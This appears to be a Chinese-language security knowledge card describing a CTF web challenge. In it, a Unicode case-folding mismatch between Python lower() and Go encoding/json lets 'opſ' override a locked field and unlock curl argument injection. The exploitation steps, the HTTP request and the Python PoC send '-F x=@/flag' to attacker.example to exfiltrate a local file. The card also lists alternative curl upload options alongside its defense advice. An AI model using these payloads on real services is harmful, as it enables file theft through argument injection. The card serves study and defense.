---
id: web-golang-unicode-casefold-json-field-curl-arg-injection
title: Python lower() 与 Go JSON 大小写折叠差异：ſ 解锁 ops 并注入 curl -F 参数
type: scenario
domain: web
path: web/golang
technique: python-go-unicode-casefold-field-curl-arg-injection
aliases:
- CloudPulse
- Unicode case-folding 字段绑定差异
- ſ 绕过 ops 锁定
- curl 参数注入 -F
- strings.Fields argv 注入
tags:
- go
- python
- unicode
- case-folding
- json
- curl
- argument-injection
- file-upload
- web-chain
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V117
  verified_at: '2026-11-06T01:46:15+08:00'
  notes: 已对照原文第7节与图02核对：Burp 请求同时含 ops=httpcheck 与 op\u017f=fetch，响应 data.files.x 回显 flag{...}，curl 实际 POST 至 httpbin.org，证明 Go encoding/json 的 Unicode case-folding 使 opſ 覆盖 Ops= fetch；后端 strings.Fields(target) 后 exec.Command("curl", parts...)，-F x=@/flag 为参数注入而非 shell 注入。未验证点：CTF 环境端点/字段随题变化，未复跑；无 CVE/受影响版本；frontmatter 无 sources/source_url。
---

## 一句话结论

前端 Python 用 `lower()` 归一化 JSON 键，后端 Go 的 `encoding/json` 按 Unicode 大小写折叠匹配结构体字段；字符 `ſ`（U+017F）在 Python 小写后仍是 `ſ`，在 Go 中却等价于 `s`。攻击者同时提交 `"ops":"httpcheck"` 与 `"opſ":"fetch"`，让后端 `Ops` 字段被覆盖为 `fetch`，进入危险分支后用空格拆分 `target` 并注入 `curl -F` 参数，把 `/flag` 以表单上传方式外带。

## 原理

- 前端（Python/Flask）对 JSON 键做 `normalized[key.lower()] = value`，并强制 `normalized["ops"] = "httpcheck"`；Python `str.lower()` 不会把 `ſ` 变成 `s`，`opſ` 保持为 `opſ`。
- 后端（Go）用 `encoding/json` 把 JSON 解码到结构体；Go 的字段匹配使用 Unicode simple case-folding，`opſ` 与 `ops` 折叠为同一字段 `Ops`。同一 JSON 对象中两个键映射到同一字段时，后出现的值覆盖前一个，于是 `Ops` 从 `httpcheck` 变成 `fetch`。
- `fetch` 分支用 `strings.Fields(target)` 按空白拆分用户输入，再 `exec.Command("curl", targetParts...)`。这不是 shell 注入，但等价于把 `target` 拆成多个 curl 参数；攻击者可注入 `-F`（multipart 表单上传）等 curl 选项。
- 应用虽禁用 `-o` 与 `file://`，但 `-F x=@/flag` 仍可让 curl 读取本地文件并 POST 到外部服务器；响应中会回显上传的文件内容/结果，形成完整外带。
- 根因是“前端归一化与后端字段绑定使用不同的 Unicode 规则”，而不是单一框架漏洞；同类差异还包括 `K`（Kelvin sign）与 `k`、`İ` 与 `i`、希腊/西里尔同形字符。

## 触发条件

- 前端对 JSON 键做小写/规范化，后端用 Go `encoding/json` 解码到结构体，且两者对非 ASCII 字符的折叠规则不一致。
- 后端字段绑定是大小写不敏感的（Go 默认），且同一字段可被多个键覆盖；没有拒绝重复/非 ASCII 键。
- 危险分支使用 `strings.Fields`/`strings.Split` 拆分用户输入并传给 `exec.Command`，允许注入命令行选项。
- 目标能访问外部服务器（用于 `-F` 上传），且 curl 支持 `-F`；`-o`/`file://` 等被禁但未禁用其他危险选项。
- 攻击者能控制 JSON 请求体，且前端不会在转发前删除未知键。

## 利用步骤

1. 阅读前端/后端源码或通过错误回显确认：前端 `lower()` 归一化、后端 Go 结构体字段名与大小写折叠行为。
2. 找到被前端强制锁定的字段（如 `ops=httpcheck`）和对应的危险分支（`fetch`）。
3. 构造 JSON：同时放 `"ops":"httpcheck"` 和 `"opſ":"fetch"`；确认 Go 把后者绑定到 `Ops` 并覆盖前者。
4. 构造 `target` 为 curl 参数序列，例如 `https://attacker.example/ -F x=@/flag`；`strings.Fields` 拆成 `["https://attacker.example/", "-F", "x=@/flag"]`。
5. 发送请求，观察响应/外部服务器是否收到包含 `/flag` 的 multipart 表单。
6. 若 `-F` 被过滤，尝试 `-T`（PUT 上传）、`-d`/`--data-binary`、`-K`（配置文件）、`--upload-file` 等 curl 选项；或利用其他参数注入点。

## PoC

```http
POST /api/probe HTTP/1.1
Host: target
Content-Type: application/json
Content-Length: 103

{
  "ops": "httpcheck",
  "opſ": "fetch",
  "target": "https://attacker.example/ -F x=@/flag"
}
```

```python
import requests, json

payload = {
    "ops": "httpcheck",
    "opſ": "fetch",
    "target": "https://attacker.example/ -F x=@/flag",
}
r = requests.post("https://target/api/probe", json=payload, verify=False)
print(r.status_code, r.text)
```

无真实目标 PoC：原文为 CTF 环境，字段名/端点/外带地址需按目标调整；核心是 Unicode 折叠差异 + `strings.Fields` + curl 选参数注入。

## 变体与关联

- **折叠字符**：`ſ`（U+017F）↔`s`、`K`（U+212A）↔`k`、`İ`（U+0130）↔`i`、希腊/西里尔同形字；不同语言/库的折叠表不同。
- **重复键**：`ops` 与 `Ops`/`OPS`/`opſ` 同时出现；JSON 解析器“后者覆盖前者”的行为可被利用。
- **参数注入**：`strings.Fields`/`strings.Split` 把用户输入拆成 argv；`exec.Command` 不经过 shell，但仍可注入 curl/wget/ffmpeg 等程序选项。
- **curl 危险选项**：`-F` 上传本地文件、`-T` PUT、`-d @file`、`-K` 读配置文件、`--proxy` 指定代理、`-o` 写文件。
- **关联**：Unicode 规范化差异、HTTP 参数污染、Go JSON 大小写折叠、curl 参数注入、SSRF/文件外带。

## 检测与防御

- **键规范化**：前后端使用同一套 Unicode 规范化（NFC/NFKC）和大小写规则；拒绝非 ASCII 键、重复键、折叠后冲突的键。
- **字段绑定**：Go 结构体解码前先做严格的键白名单校验；不要依赖 `encoding/json` 的大小写不敏感匹配；对同一字段的重复赋值报错。
- **命令参数**：不要用 `strings.Fields` 拆分用户输入后直接传给 `exec.Command`；使用结构化参数与 allowlist，禁止用户控制程序选项；必要时用 `--` 终止选项解析。
- **curl 限制**：禁用 `-F`/`-T`/`-K`/`-o`/`--proxy` 等危险选项；用专门的 HTTP 客户端替代 curl；限制出网目标。
- **检测**：监控 JSON 中出现非 ASCII 键、重复键、折叠冲突；监控 curl 命令行含 `-F`/`-T`/`@`/`--data-binary` 的请求；对上传到外部域名的异常 multipart 流量告警。

## 可信度与边界

- 原文为 CTF Web 题，`opſ` 覆盖 `Ops`、`-F x=@/flag` 外带与响应回显均有截图/请求证据；攻击链完整。
- 具体字段名、端点、前端锁定逻辑为该题实现；真实目标需按源码确认折叠规则与危险分支。
- 未在真实目标复跑；卡内不包含题目 flag。
